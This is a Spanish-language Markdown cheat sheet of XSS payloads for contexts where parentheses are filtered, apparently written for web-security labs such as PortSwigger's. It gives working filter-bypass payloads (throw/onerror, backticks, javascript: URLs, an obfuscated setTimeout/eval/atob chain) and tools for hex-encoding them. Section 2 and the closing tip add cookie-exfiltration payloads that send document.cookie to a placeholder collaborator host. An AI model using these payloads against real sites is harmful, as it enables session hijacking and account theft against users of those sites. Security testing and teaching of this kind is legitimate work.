---
tags:
  - obfuscation
  - xss
  - javascript
  - filter-bypass
---

# XSS - Bypass de `()` filtrados y encoding

Notas para cuando los **paréntesis `()` se sanitizan** en un contexto de inyección JS
(reflected/DOM XSS, PortSwigger, etc.). Objetivo: ejecutar código sin `(` `)` literales,
y cómo convertir tu payload a escapes hexadecimales `\xNN`.

> Para el detalle profundo de ejecución JS con toda clase de filtros (comillas,
> keywords, `eval(`${x}`)`, alfanumérico puro) mira **[js-obfuscation.md](js-obfuscation.md)**.
> Este archivo se centra en el contexto **XSS/HTML** y el encoding.

---

## 🔎 Índice

| Objetivo | Técnicas | Ir a |
|----------|----------|------|
| Ejecutar **sin `()`** | throw+onerror · throw+onerror=eval · backticks · `location=javascript:` · event handlers | [[#1. Ejecutar sin paréntesis\|§1]] |
| Payload **ofuscado** | `setTimeout`+`eval`+`atob` (base64) · exfiltrar cookie | [[#2. `eval` + decode (payload complejo / ofuscado)\|§2]] |
| Convertir a **`\xNN`** | tabla hex · generar (JS/bash/PS) · otros formatos | [[#3. Convertir string -> escapes `\xNN` (hex)\|§3]] |
| Decidir rápido | chuleta situación → payload | [[#4. Chuleta de decisión rápida\|§4]] |

> Detalle profundo de ejecución JS: [[js-obfuscation]]. Encoding por objetivo: [[encodings]].

---

## 1. Ejecutar sin paréntesis

### `throw` + `onerror` (la más usada)
`onerror` recibe como argumento lo que lanza `throw`.
```javascript
onerror=alert;throw 1              // llama alert(1)
onerror=alert;throw document.cookie
```

### `throw` + `onerror=eval` (para payloads arbitrarios)
```javascript
window.onerror=eval;throw'=alert\x281\x29';
window.onerror=eval;throw"\x3d1;alert\x281\x29";
```
- `window.onerror=eval` -> el handler de error pasa a ser `eval`.
- `throw '=alert(1)'` -> el navegador evalúa el string. El `=` inicial neutraliza
  el prefijo `"Uncaught "` que añade el navegador.

### Backticks (template literals) — sustituyen a `()`
```javascript
alert`1`
print`1`
setTimeout`alert\x281\x29`     // setTimeout evalua el string como codigo
```
Nota: `` eval`...` `` recibe un ARRAY, no un string -> poco fiable.
Preferir `` setTimeout`...` `` para evaluar strings.

### `location` con `javascript:`
```javascript
location='javascript:alert%281%29'          // ( codificado como %28
location='javascript:eval\x28atob\x28...\x29\x29'
```

### Asignación de handler (el navegador invoca, tú no)
```html
<img src=x onerror=alert`1`>
<img src=x onerror=onerror=eval;throw'=alert\x281\x29'>
```

---

## 2. `eval` + decode (payload complejo / ofuscado)

### setTimeout + eval + atob (base64)
Todos los `(` `)` `'` `=` van como `\x28 \x29 \x27 \x3d`.
El único "paréntesis real" es el backtick de `setTimeout`:
```javascript
setTimeout`eval\x28atob\x28\x27<TU_BASE64>\x27\x29\x29`
```

### Preparar el base64 (en la consola del navegador)
```javascript
btoa("document.location='https://TU-COLLAB/?c='+document.cookie")
```

### Exfiltrar cookie (ejemplo de payload final)
```javascript
document.location='https://TU-COLLAB/?c='+document.cookie
// o
fetch('https://TU-COLLAB/?c='+document.cookie)
```

---

## 3. Convertir string -> escapes `\xNN` (hex)

`\xNN` = un carácter por su código ASCII/Latin-1 en **hex de 2 dígitos**.
Sirve dentro de strings JS para ocultar `(`, `)`, `'`, `=`, etc.

### Tabla rápida de los más usados
| Carácter | Hex     |
|----------|---------|
| `(`      | `\x28`  |
| `)`      | `\x29`  |
| `'`      | `\x27`  |
| `"`      | `\x22`  |
| `=`      | `\x3d`  |
| `;`      | `\x3b`  |
| `/`      | `\x2f`  |
| `<`      | `\x3c`  |
| `>`      | `\x3e`  |
| `.`      | `\x2e`  |
| `:`      | `\x3a`  |
| espacio  | `\x20`  |

### Generar hex desde JS (consola del navegador)
```javascript
// String -> \xNN
[...'alert(1)'].map(c=>'\\x'+c.charCodeAt(0).toString(16).padStart(2,'0')).join('')
// => "\x61\x6c\x65\x72\x74\x28\x31\x29"
```

### Solo codificar los caracteres "peligrosos" (más legible)
```javascript
'alert(1)'.replace(/[()'"=;<>\/]/g,
  c => '\\x' + c.charCodeAt(0).toString(16).padStart(2,'0'))
// => "alert\x281\x29"
```

### Desde bash / linux
```bash
echo -n 'alert(1)' | xxd -p -c1 | sed 's/^/\\x/' | tr -d '\n'; echo
```

### Desde PowerShell
```powershell
-join ([char[]]'alert(1)' | % { '\x{0:x2}' -f [int]$_ })
```

### Otros formatos de escape útiles
```text
\x28            // hex JS = (
(          // unicode 4 digitos = (
\u{28}          // unicode ES6 = (
&#40;  &#x28;   // HTML entities = (
&lpar;          // HTML named entity = (
%28             // URL encoding = (
```

---

## 4. Chuleta de decisión rápida

| Situación                          | Payload                                              |
|------------------------------------|------------------------------------------------------|
| Solo prueba (PoC)                  | `onerror=alert;throw 1`                              |
| `alert` con backticks permitido    | `` alert`1` ``                                       |
| Necesito `eval` de string          | `window.onerror=eval;throw'=alert\x281\x29'`         |
| Payload largo / ofuscado           | `` setTimeout`eval\x28atob\x28\x27<b64>\x27\x29\x29` `` |
| Contexto de URL/atributo           | `location='javascript:alert%281%29'`                 |

> Tip: alinea primero con un `alert` de prueba, y solo cuando confirmes ejecución
> cambia al payload real (exfiltración de cookie).
